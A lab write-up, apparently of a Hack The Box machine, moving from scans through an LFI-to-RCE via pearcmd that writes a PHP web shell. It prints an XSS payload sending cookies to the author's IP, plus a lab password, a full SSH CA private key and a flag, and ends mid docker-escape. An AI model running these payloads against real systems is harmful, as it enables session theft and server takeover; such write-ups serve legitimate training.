# Initial Enumeration

As usual we are provided only the entry point IP and we know that the machine should be running on behalf of a Linux based machine.

![1d714c6c712607e228c5f2a59f4ef7a9.png](../../../_resources/1d714c6c712607e228c5f2a59f4ef7a9.png)

Without further do I will start by checking all the running sevices on the TCP protocoll.

```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBATYMh9+BdqMhKwmA92batW+nssvLnig8s6LRKfe4TUd4IfmWsL1NeMU+03etGZssHGdzVGuKWinJEZP8nxPCSg=
|   256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDBeEEQbMbbA8xyqfl6Z4O04eLAIn5/kX1+dhQn96SJp
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://itrc.ssg.htb/
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPYMhQGEpSM4Alh2GZifayHk69JaFxvinZsgYG+EmcDoShW6Q24vrCoG7QFlArzIHmzoNyPewZ05MjQ7dKttWbk=
|   256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINF7vRlT0/vggYRb7yoEPXwV4ZAZEu0Qq/mfj1sKKjnK
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 4.15 - 5.8 (96%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=8/4%OT=22%CT=%CU=40125%PV=Y%DS=2%DC=T%G=N%TM=66AF8467%P=x86_64-pc-linux-gnu)
SEQ(SP=FE%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M550ST11NW7%O2=M550ST11NW7%O3=M550NNT11NW7%O4=M550ST11NW7%O5=M550ST11NW7%O6=M550ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=3F%W=FAF0%O=M550NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=3F%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=3F%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 42.848 days (since Sat Jun 22 19:17:08 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=254 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Immediately i see 2 different SSH services and a self hosted website pointing to the FQDN  `http://itrc.ssg.htb` as well.

But I will perform the same scan over the UDP protocol as well.

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads]
└─# nmap -sU -F 10.129.78.69
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-04 15:46 CEST
Nmap scan report for itrc.ssg.htb (10.129.78.69)
Host is up (0.044s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 103.12 seconds
```

Not much so let's dig into the services.

&nbsp;

# SSH / 2222(TCP)

In this case even if there are 2 different ssh services running on this server at this early stage I can't really do anything so I will temporary move on for now.

Remember that brute-force of ssh is not an intended way and will not be contempt by any means, I will come back in case if I find a valid set of working credentials.

&nbsp;

# HTTP

We noticed from our first scan that the website is performing a redirect to another vhost that have been already added to my local hosts file in order to resolute the address.

The website seems referring to a IT service company?  
<br/>

![6cb8b3408e2c9b25cda2389b0f1a3c23.png](../../../_resources/6cb8b3408e2c9b25cda2389b0f1a3c23.png)

I see a login/register function but before jumping into it, I will check presence of hidden "gems" like other VHOSTS or file and folders.

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://itrc.ssg.htb" -H "Host:FUZZ.itrc.ssg.htb" -fl 8

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://itrc.ssg.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.itrc.ssg.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 8
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 1538 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

No other VHOSTS but I see an API endpoint, an upload endpoint and I see an ADMIN.php which gives us idea about the php being used as main programming language for the backend logic.

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads]
└─# dirsearch -u "http://itrc.ssg.htb" 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/millycash/Downloads/reports/http_itrc.ssg.htb/_24-08-04_15-55-14.txt

Target: http://itrc.ssg.htb/

[15:55:14] Starting: 
[15:55:15] 403 -  277B  - /.ht_wsr.txt
[15:55:15] 403 -  277B  - /.htaccess.bak1
[15:55:15] 403 -  277B  - /.htaccess.orig
[15:55:15] 403 -  277B  - /.htaccess.save
[15:55:15] 403 -  277B  - /.htaccessOLD
[15:55:15] 403 -  277B  - /.htaccess_orig
[15:55:15] 403 -  277B  - /.htaccessBAK
[15:55:15] 403 -  277B  - /.htaccess.sample
[15:55:15] 403 -  277B  - /.htaccess_sc
[15:55:15] 403 -  277B  - /.htaccess_extra
[15:55:15] 403 -  277B  - /.htaccessOLD2
[15:55:15] 403 -  277B  - /.html
[15:55:15] 403 -  277B  - /.htm
[15:55:15] 403 -  277B  - /.htpasswd_test
[15:55:15] 403 -  277B  - /.httr-oauth
[15:55:15] 403 -  277B  - /.htpasswds
[15:55:19] 200 -   46B  - /admin.php
[15:55:23] 301 -  310B  - /api  ->  http://itrc.ssg.htb/api/
[15:55:23] 403 -  277B  - /api/
[15:55:23] 301 -  313B  - /assets  ->  http://itrc.ssg.htb/assets/
[15:55:23] 403 -  277B  - /assets/
[15:55:27] 200 -   46B  - /dashboard.php
[15:55:28] 200 -    0B  - /db.php
[15:55:31] 200 -  507B  - /home.php
[15:55:34] 200 -  241B  - /login.php
[15:55:34] 302 -    0B  - /logout.php  ->  index.php
[15:55:41] 200 -  263B  - /register.php
[15:55:42] 403 -  277B  - /server-status
[15:55:42] 403 -  277B  - /server-status/
[15:55:47] 301 -  314B  - /uploads  ->  http://itrc.ssg.htb/uploads/
[15:55:47] 403 -  277B  - /uploads/

Task Completed
```

Now, seems like we can do anything from the outside so i will create a new dummy user and get a valid session into server's backend.

![8dd3811db2508ee600e2aa99fe8e8643.png](../../../_resources/8dd3811db2508ee600e2aa99fe8e8643.png)

And immediately I see that the api it is pointint to php based code?

```
POST /api/register.php HTTP/1.1
Host: itrc.ssg.htb
Content-Length: 49
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://itrc.ssg.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://itrc.ssg.htb/?page=register
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,fi;q=0.8
Cookie: PHPSESSID=2cd3877d4b0b51100bd26b08ead8f9a0
Connection: keep-alive

user=yovecio&pass=Coglione1%21&pass2=Coglione1%21
```

Same goes for the login function:

```
POST /api/login.php HTTP/1.1
Host: itrc.ssg.htb
Content-Length: 30
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://itrc.ssg.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://itrc.ssg.htb/index.php?page=login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,fi;q=0.8
Cookie: PHPSESSID=2cd3877d4b0b51100bd26b08ead8f9a0
Connection: keep-alive

user=yovecio&pass=Coglione1%21
```

Now I check and see that the admin page can be reached via `http://itrc.ssg.htb/?page=admin` which show all the available tickets and some interactions?

![46fce7b1169bf7806e3b431eda6b9574.png](../../../_resources/46fce7b1169bf7806e3b431eda6b9574.png)

From here I see a possible username names ***zzinter***?

But the check server it actually performs a easy ping?

![692b63a8c6f383d3b9592a8bf2f27b58.png](../../../_resources/692b63a8c6f383d3b9592a8bf2f27b58.png)

And we can see the traffic back on our server:

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads]
└─# tcpdump -i tun0 icmp  
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:09:41.826862 IP ssg.htb > kali-bello: ICMP echo request, id 3, seq 1, length 64
16:09:41.826894 IP kali-bello > ssg.htb: ICMP echo reply, id 3, seq 1, length 64
```

The AD provision seems only asking the ADMIN team to provision a new user? Unsure if it is legit or something?

![c8a46e66c9c4f3c9a2ff7551ac8b77ad.png](../../../_resources/c8a46e66c9c4f3c9a2ff7551ac8b77ad.png)I seems not being able to open any other ticket, most likely cause I am missing the credentials for the ADMIN group?

![00142ac2561e5f914bc0172b586368ee.png](../../../_resources/00142ac2561e5f914bc0172b586368ee.png)Now I tried to create a dummy ticket and I see it indeed under the ID:9?

![2720a7db30f30a7a70a29c0acdb470b7.png](../../../_resources/2720a7db30f30a7a70a29c0acdb470b7.png)Since we know it is about PHP and the admin team can see the ticket itself:

![3363334c02a73f2612c41bf781cfcf4e.png](../../../_resources/3363334c02a73f2612c41bf781cfcf4e.png)

I am wondering if I can somehow spoof the PHP cookie of the victim via XSS?

```
<sCrIpt>document.location='http://10.10.14.185/grabber.php?cookie='+document.cookie</sCrIpt>
```

But seems like the body text field is threating everything as a text and not as a HTML so what about the comment field instead?  
![66d0b4524e9976dd7282df63abc37475.png](../../../_resources/66d0b4524e9976dd7282df63abc37475.png)

Same goes for comments:

![76f30575358612f3c682a9c141958a9c.png](../../../_resources/76f30575358612f3c682a9c141958a9c.png)

But what about the title instead? Still no...

&nbsp;

# Attempt nr #2

In this case i had to ask for tips and apparently some users told me to check the LFI on the `/?page=` parameter.

Specifically i noticed that the backend append the ***.php*** on every request which is the reason why it most likely fails on normal lfi... But guessing we can see that the LFI supposedly works?

```
GET /index.php?page=/var/www/itrc/api/register HTTP/1.1
Host: itrc.ssg.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,fi;q=0.8
Cookie: PHPSESSID=2cd3877d4b0b51100bd26b08ead8f9a0
Connection: keep-alive
```

![1f01040b58f2a9e1a6d7c187f9314311.png](../../../_resources/1f01040b58f2a9e1a6d7c187f9314311.png)

But here I got another tips, and apparently it is about this exploit? https://github.com/Mr-xn/thinkphp_lang_RCE

TBH: Not sure how it the hell they managed to get to this conclusion? But sending this should make it working?

```
GET /?page=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?system($_GET['cmd']);?>+/var/www/itrc/uploads/shell.php HTTP/1.1
Host: itrc.ssg.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,fi;q=0.8
Cookie: PHPSESSID=2cd3877d4b0b51100bd26b08ead8f9a0
Connection: keep-alive
```

![ab23526d58ec47cafd1520e6ae8b167d.png](../../../_resources/ab23526d58ec47cafd1520e6ae8b167d.png)

![04536b9801f18ef1be3ac3c41ce6cb83.png](../../../_resources/04536b9801f18ef1be3ac3c41ce6cb83.png)

But now we should be able to get a rce?

![d0708c1bcb992817ee50f13e16f7b4b2.png](../../../_resources/d0708c1bcb992817ee50f13e16f7b4b2.png)

Nice now we can attempt to get a rce! But it fails so i got another tips to check for hidden files under downloads and we can see it under the working directory:

![27d5d895414face9bd7cd93845c51343.png](../../../_resources/27d5d895414face9bd7cd93845c51343.png)

&nbsp;

Now seems like we have 6 different zip archives to check?

![f914f7fd4bab0a0ccf87891573af51ca.png](../../../_resources/f914f7fd4bab0a0ccf87891573af51ca.png)

Now the only files that resembles something are the following:

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Resources]
└─# ll
total 3012
-rw-r--r-- 1 root root 1162513 Feb  6 22:38 c2f4813259cc57fab36b311c5058cf031cb6eb51.zip
-rw-r--r-- 1 root root     634 Feb  6 22:46 e8c6575573384aeeab4d093cc99c7e5927614185.zip
-rw-r--r-- 1 root root     275 Feb  6 22:42 eb65074fe37671509f24d1652a44944be61e4360.zip
-rw-r--r-- 1 root root      99 Feb  6 22:41 id_ed25519.pub
-rw-r--r-- 1 root root     569 Feb  6 22:46 id_rsa.pub
-rw-rw-r-- 1 root root 1903087 Feb  6 22:36 itrc.ssg.htb.har
```

The first 2 seems some SSH public keys:

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Resources]
└─# cat id_ed25519.pub                                               
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMI916//9yp/9z9HQn1OCxitlWqEYWkLoST6Z+5dNSBs bmcgregor@ssg.htb
                                                                                                                                                                                  
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Resources]
└─# cat id_rsa.pub    
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDa1RS3oCZOLoHXlCKYKOBCiaQzNA9weEgvkEyVCr6Wrtlli8clZi5tJkZiRUyRkqrvR6lX3uzEY/OePxDq0/i73bYN2wc60AXn0UFm8WEqfu5fYSao8vZK/Yop80NAXA/x2JHeK74nC8feM9+u004NSjmj5tC8I8C6ywF0ZPu9Bym0RC/Nm8kOGDmrNWqV03owO5XzHBu5u4P1WdL7ge4JAmB0lE7eNv0FJATxQ4hHZghtQvOu3qWUqEbyjzkKrMbKuF2KPIiH3Ep6dWrbKjJ9MIUATJDwNwK6h5x10s/G6aQ8jkPKe0s1SucovFb9b3C/PiYmjlMoAVqoMF8mrQ3NFIsgFFGsJ+pUSMUIkZ/2/EfsPEmA1jfkzEAD18UH1PtXo4GehRAbKw9lcbu1MbQHMGJg+0W/95RxK+wy0NSLuwmycKvpY8MKO9MWP6UMoQmAhYEToulcfwrDGD9ncbzzTd1A951JWkpynGqVKazDIvvrb+MF1XXib2HYZ/7XGQs= mgraham@ssg.htb
```

And the last is some kind of JSON verbose?

![e21e82fe27cf9a0bc5dfc3496c3466ae.png](../../../_resources/e21e82fe27cf9a0bc5dfc3496c3466ae.png)

here I got the tips to look for juicy stuff, so let's see if we can see some passwords?

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Resources]
└─# cat itrc.ssg.htb.har | grep -i "pass"
            "text": "user=msainristil&pass=82yards2closeit",
                "name": "pass",
            "text": "/*!\n * Bootstrap Icons v1.11.3 (https://icons.getbootstrap.com/)\n * Copyright 2019-2024 The Bootstrap Authors\n * Licensed under MIT (https://github.com/twbs/icons/blob/main/LICENSE)\n */@font-face{font-display:block;font-family:bootstrap-icons;src:url(\"fonts/bootstrap-icons.woff2?dd67030699838ea613ee6dbda90effa6\") format(\"woff2\"),url(\"fonts/bootstrap-icons.woff?dd67030699838ea613ee6dbda90effa6\") format(\"woff\")}.bi::before,[class*=\" bi-\"]::before,[class^=bi-]::before{display:inline-block;font-family:bootstrap-icons!important;font-style:normal;font-weight:400!important;font-variant:normal;text-transform:none;line-height:1;vertical-align:-.125em;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.bi-123::before{content:\"\\f67f\"}.bi-alarm-fill::before{content:\"\\f101\"}.bi-alarm::before{content:\"\\f102\"}.bi-align-bottom::before{content:\"\\f103\"}.bi-align-center::before{content:\"\\f104\"}.bi-align-end::before{content:\"\\f105\"}.bi-align-middle::b
```

And we have some credentials? And this get's us access to the machine!

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Resources]
└─# ssh msainristil@10.129.78.69        
msainristil@10.129.78.69's password: 
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug  4 16:31:48 2024 from 10.10.14.185
msainristil@itrc:~$ hostname
itrc
msainristil@itrc:~$ ll -al
-bash: ll: command not found
msainristil@itrc:~$ ls -al
total 32
drwx------ 1 msainristil msainristil 4096 Jul 23 14:22 .
drwxr-xr-x 1 root        root        4096 Jul 23 14:22 ..
lrwxrwxrwx 1 root        root           9 Jul 23 14:22 .bash_history -> /dev/null
-rw-r--r-- 1 msainristil msainristil  220 Mar 29 19:40 .bash_logout
-rw-r--r-- 1 msainristil msainristil 3526 Mar 29 19:40 .bashrc
-rw-r--r-- 1 msainristil msainristil  807 Mar 29 19:40 .profile
drwxr-xr-x 1 msainristil msainristil 4096 Jan 24  2024 decommission_old_ca
msainristil@itrc:~$
```

&nbsp;

# Road to user.txt

Now inside the home folder we can see a old ca saved on the server:

```
msainristil@itrc:~/decommission_old_ca$ ls
ca-itrc  ca-itrc.pub
msainristil@itrc:~/decommission_old_ca$ cat ca-itrc
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA6AQ9VKBXy+NYPxVV9+963ZuVj8/kmdG1reT2D/nYaJOL291KSTyB
jngLF5gJMxFWARyIhPmhm63F7w2km2XOnCNmmXxa2hD7dPNClShwCwD4Gjp/8xXZXfD/cm
hDSgSpbVi2fSOq8IPfCBhE6AeyTWRfYc2rI4w9CAyr/CUNzcIpg3GU3Oi3tIScOdgDXC7M
7XpYhUsqE7cvTf6FIE1I5BbILK6BIfjp8+G7lQ9m8aGfvZjg3HWE0OAocGp38xUp0607QE
Kybch/2w0U2tgaZnZmHULvuB3Gw5eTW4hMLtRTbJM/2DQz5Kt2xGBDr4DIrv9GTMtMHq3M
ek59BtnKaUu9P6xuRjHCYtFk3FInN5PlydfdVhBtRLVyTW2XbSXOystBCoWrdHYHJPM6au
tpHo7ZAUHfOqehb0fPsR9/yTMR7zDVWFTgybfzCIpPfbFm+UOzQlXCF0NHo1U80yPUE9u5
JvxVIJd3LOQmeBiDe6aJT3p0FxJnZmwTlg9oa5S7AAAFiE//PKhP/zyoAAAAB3NzaC1yc2
EAAAGBAOgEPVSgV8vjWD8VVffvet2blY/P5JnRta3k9g/52GiTi9vdSkk8gY54CxeYCTMR
VgEciIT5oZutxe8NpJtlzpwjZpl8WtoQ+3TzQpUocAsA+Bo6f/MV2V3w/3JoQ0oEqW1Ytn
0jqvCD3wgYROgHsk1kX2HNqyOMPQgMq/wlDc3CKYNxlNzot7SEnDnYA1wuzO16WIVLKhO3
L03+hSBNSOQWyCyugSH46fPhu5UPZvGhn72Y4Nx1hNDgKHBqd/MVKdOtO0BCsm3If9sNFN
rYGmZ2Zh1C77gdxsOXk1uITC7UU2yTP9g0M+SrdsRgQ6+AyK7/RkzLTB6tzHpOfQbZymlL
vT+sbkYxwmLRZNxSJzeT5cnX3VYQbUS1ck1tl20lzsrLQQqFq3R2ByTzOmrraR6O2QFB3z
qnoW9Hz7Eff8kzEe8w1VhU4Mm38wiKT32xZvlDs0JVwhdDR6NVPNMj1BPbuSb8VSCXdyzk
JngYg3umiU96dBcSZ2ZsE5YPaGuUuwAAAAMBAAEAAAGAC7cZwQSppOYRW3oV0a5ExhzS3q
SbgTgpaXhBWR7Up7nPhZC1GAvslMeInoPdmbewioooyzdu9WqUWdTsBga2zy6AbJPuuHUZ
ZVcvz6fvjwwDpbtky4mZD1kZuj/71H3Lb6CGR7z90XrZz6b+D7iXxGL4PVAtFIntE6jOzw
KwoZOXageEVz/kSsKpashL/yMZKOKVHAHmxCvAlo/D+WoS71Ab18Rl89OwPdFyRH1hxXtT
krdonz512uApWpJzBRIBO+JjqpJQKCPK3mavMd9eRy9rzAdAqNqL1JSHoGSnL3hxba2WUN
bQJcbz5tNqP11QBr/kAxpZTKBVN+MuGrihn9qYVdRY+5Kw0xOkl651KladwoSx59+p1Hdl
UpcrRpWRs04YE6wm/nlYbHrrrIz9uf/5MywxPX9k0jY3HxuigENrncqN3G4uQ+pwg6mgvW
ZVQAlKoSCg3lUCH+HnBQGFhpgwkC9/Rk6eSmH7mxXHzCBUygLolpoHCtIkBmFk/DHlAAAA
wQDf9Dc4vGGBDoEKvE+s1FE+9iZv1GstaPv/uMdMIXWa3ySjIjcXmWM6+4fK8hyiBKibkR
sVICBhlKJrfyhm/b/Jt5uWNTVt57ly2wsURlkRrbxA/j4+e2zaj86ySuF0v8Eh1dIxWE3r
QsAmrFWr1nbL/kpjOfMXogIkJdQwHd+s0Y3SZvGWPBk/jjMZWj4lvpfRQMesfb/t6G+E97
sX3ZpN/LQGTWGtCjO3CDWkzU9mvYRc+W92IudQDiXmLoW2GxIAAADBAPhDFOuMjAGpkzyJ
tZsHuPHleZKES5v/iaQir3hzywxUuv+LqUsQhsuGpRZK0IR/i+FzbeDiB/7JSAgxawZHvr
2PwsiiEjXrrTqmrMSWZawC9kmfG0/ya48C5mtpqtKJpbPmYG/Dm5umHu5AJrr6DOqOnoKC
UhUYt2eob91dvGI1eh6UBgVGacsKP9X+ciDPvFHmpMFUDq/JcJgKTbV7XfIZDQTb4SPew1
wCN2sv6FWmJmJ0uT4pSgj7m8OeKjZB1wAAAMEA7z+IaiRfJPcy5kLiZbdHQGwgnBhxRojd
0UFt4QVzoC/etjY5ah+kO8FLGiUzNSW4uu873pIdH60WYgR4XwXT/CwwRnt9FwQ7DlFmO5
LK226u0RfVdkJjo3lx04LEiYZ27JfzfFmzvTGfLDddbWMFQA3ATiKhryj0JJqxqbEBmG4m
RX3ajkx+O8cbBU4WMfQXutRVlDyV630oMPPVUrYm4SxZGJgEcq3nK6uQGPxXmAV/sMTNsm
A9QyX0p7GeHa+9AAAAEklUUkMgQ2VydGlmY2F0ZSBDQQ==
-----END OPENSSH PRIVATE KEY-----
msainristil@itrc:~/decommission_old_ca$
```

This ca can be used to sing a public certificate used for host authentication(ssh -i my.key) to authenticate as any user on the server.

See this: https://stackoverflow.com/questions/70694596/sign-a-public-key-with-a-ca-private-key

Basically we need to generate a new local certificate that we will be using for root takeover.

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Resources]
└─# ssh-keygen -t rsa -b 2048 -f root                              
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in root
Your public key has been saved in root.pub
The key fingerprint is:
SHA256:rcNqLVbfhv1WIHWVJOrAHubdd0Ac2jhkNsHZ6+ISrnI root@kali-bello
The key's randomart image is:
+---[RSA 2048]----+
|           .**+o+|
|        .  ++*=..|
|         = .+.oo |
|        +.= o.o. |
|        So.o + o.|
|       .... . o o|
|       o+o * . . |
|      =.E.= = .  |
|     o.+.. o o.  |
+----[SHA256]-----+
```

Now this public key need to be signed with the ca certificate and this is what i got from chat gtp:

![38aa21387d32690b143e1f5669e2cf7e.png](../../../_resources/38aa21387d32690b143e1f5669e2cf7e.png)

And now we have it signed as root user:

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Resources]
└─# ssh-keygen -s ./ca_int -n root -I 1 root.pub 
Signed user key root-cert.pub: id "1" serial 0 for root valid forever
```

We cab double check the info:

```
┌──(root㉿kali-bello)-[/home/millycash/Downloads/Resources]
└─# ssh-keygen -L -f root-cert.pub 
root-cert.pub:
        Type: ssh-rsa-cert-v01@openssh.com user certificate
        Public key: RSA-CERT SHA256:rcNqLVbfhv1WIHWVJOrAHubdd0Ac2jhkNsHZ6+ISrnI
        Signing CA: RSA SHA256:BFu3V/qG+Kyg33kg3b4R/hbArfZiJZRmddDeF2fUmgs (using rsa-sha2-512)
        Key ID: "1"
        Serial: 0
        Valid: forever
        Principals: 
                root
        Critical Options: (none)
        Extensions: 
                permit-X11-forwarding
                permit-agent-forwarding
                permit-port-forwarding
                permit-pty
                permit-user-rc
```

And now we are in as root and we can do what we want:

```
┌──(root㉿kali-bello)-[~millycash/Downloads/Resources]
└─# ssh -i root -i root-cert.pub root@ssg.htb     
Linux itrc 5.15.0-117-generic #127-Ubuntu SMP Fri Jul 5 20:13:28 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul 25 12:49:07 2024 from 10.10.14.23
root@itrc:~# ls -al
total 16
drwx------ 1 root root 4096 Jul 23 14:22 .
drwxr-xr-x 1 root root 4096 Jul 23 14:22 ..
lrwxrwxrwx 1 root root    9 Jul 23 14:22 .bash_history -> /dev/null
```

And grab another flag from the other user:

```
root@itrc:/# cd /home/zzinter/
root@itrc:/home/zzinter# cat user.txt 
32df3d9445475537efd3f720e758d209
root@itrc:/home/zzinter#
```

&nbsp;

# Road to root.txt

Now we are root inside the machine and no traces of the root.txt this is because I noticed we are into a docker container and we need to perform a docker escape:

![11d88e8e7cd5770ded22a76629a0e2af.png](../../../_resources/11d88e8e7cd5770ded22a76629a0e2af.png)

I see some stuff that might help:

```
══╣ Breakout via mounts
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts
═╣ /proc mounted? ................. No
═╣ /dev mounted? .................. No
═╣ Run unshare .................... No
═╣ release_agent breakout 1........ No
═╣ release_agent breakout 2........ No
═╣ core_pattern breakout .......... No
═╣ binfmt_misc breakout ........... No
═╣ uevent_helper breakout ......... No
═╣ is modprobe present ............ No
═╣ DoS via panic_on_oom ........... No
═╣ DoS via panic_sys_fs ........... No
═╣ DoS via sysreq_trigger_dos ..... No
═╣ /proc/config.gz readable ....... No
═╣ /proc/sched_debug readable ..... No
═╣ /proc/*/mountinfo readable ..... Yes
═╣ /sys/kernel/security present ... Yes
═╣ /sys/kernel/security writable .. No
```

&nbsp;Next i decided to use this tool to enumerate deeper the containers: https://github.com/cdk-team/CDK

Now I see where it gets the hosts file:

```
0:57 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
0:58 / /dev rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64
